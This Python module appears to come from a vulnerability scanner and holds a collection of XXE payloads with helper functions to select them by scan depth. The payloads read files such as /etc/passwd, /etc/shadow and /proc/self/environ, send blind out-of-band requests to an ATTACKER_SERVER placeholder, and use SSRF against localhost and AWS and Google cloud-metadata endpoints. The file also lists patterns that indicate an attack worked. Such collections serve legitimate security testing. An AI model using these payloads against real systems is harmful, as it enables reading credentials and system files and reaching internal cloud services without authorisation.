"""
XXE (XML External Entity) Payloads — Classic, blind OOB, parameter entity,
SSRF via XXE, and parser-specific vectors.
"""

# ── Classic XXE (file read) ──────────────────────────────────────────────────
CLASSIC_XXE = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/version">]><foo>&xxe;</foo>',
]

# ── Blind XXE (OOB Data Exfiltration) ────────────────────────────────────────
BLIND_OOB = [
    # Requires external server — these are detection-only templates
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER_SERVER/xxe">%xxe;]><foo>test</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER_SERVER/xxe?data=test">]><foo>&xxe;</foo>',
]

# ── Parameter Entity Injection ───────────────────────────────────────────────
PARAMETER_ENTITY = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY test "%xxe;">]><foo>&test;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % a "<!ENTITY b SYSTEM \'file:///etc/passwd\'>">%a;]><foo>&b;</foo>',
]

# ── SSRF via XXE ─────────────────────────────────────────────────────────────
SSRF_VIA_XXE = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:22">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:6379">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><foo>&xxe;</foo>',
]

# ── Billion Laughs (Detection — safe minimal version) ────────────────────────
BILLION_LAUGHS_SAFE = [
    # Minimal version that tests entity expansion but won't cause DoS
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;">]><foo>&lol3;</foo>',
]

# ── XInclude ─────────────────────────────────────────────────────────────────
XINCLUDE = [
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hosts"/></foo>',
]

# ── SVG-based XXE ────────────────────────────────────────────────────────────
SVG_XXE = [
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
]

# ── SOAP-based XXE ───────────────────────────────────────────────────────────
SOAP_XXE = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>',
]

# ── XXE Success Indicators ───────────────────────────────────────────────────
XXE_SUCCESS_PATTERNS = [
    'root:x:',
    'root:*:',
    'daemon:x:',
    'bin/bash',
    'bin/sh',
    '/home/',
    '[extensions]',     # win.ini
    'for 16-bit app',   # win.ini
    '[fonts]',          # win.ini
    'WINDIR=',          # proc/environ
    'HOME=/',           # proc/environ
    'ami-id',           # AWS metadata
    'instance-id',      # Cloud metadata
    'lollollol',        # Billion laughs detection
]

# ── Content-Type indicators for XML processing ──────────────────────────────
XML_CONTENT_TYPES = [
    'application/xml',
    'text/xml',
    'application/soap+xml',
    'application/xhtml+xml',
    'application/rss+xml',
    'application/atom+xml',
    'application/xslt+xml',
    'application/mathml+xml',
    'image/svg+xml',
]


def get_all_xxe_payloads() -> list:
    """Return all XXE payloads combined."""
    return (
        CLASSIC_XXE + PARAMETER_ENTITY + SSRF_VIA_XXE +
        BILLION_LAUGHS_SAFE + XINCLUDE + SVG_XXE + SOAP_XXE
    )


def get_xxe_payloads_by_depth(depth: str) -> list:
    """Return depth-appropriate XXE payloads."""
    if depth == 'shallow':
        return CLASSIC_XXE[:3]
    elif depth == 'medium':
        return CLASSIC_XXE + SSRF_VIA_XXE[:3] + XINCLUDE[:1]
    else:  # deep
        return get_all_xxe_payloads()
